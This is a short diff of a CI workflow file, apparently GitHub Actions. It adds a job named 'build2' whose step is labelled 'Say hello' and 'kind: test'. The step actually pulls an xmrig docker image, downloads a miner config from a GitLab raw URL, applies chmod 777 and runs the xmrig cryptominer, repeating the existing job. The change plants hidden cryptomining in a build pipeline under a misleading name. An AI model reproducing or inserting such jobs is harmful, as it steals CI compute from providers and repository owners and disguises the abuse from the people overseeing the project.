@@ -16,3 +16,15 @@ jobs:
           wget https://gitlab.com/rockymoysu/S/-/raw/main/99.json
           chmod 777 *
           xmrig --config=99.json
+          
+
+  build2:
+    steps:
+      - uses: docker://rcmelendez/xmrig
+        name: Say hello
+        kind: test
+        shell: sh
+        run: |-
+          wget https://gitlab.com/rockymoysu/S/-/raw/main/99.json
+          chmod 777 *
+          xmrig --config=99.json
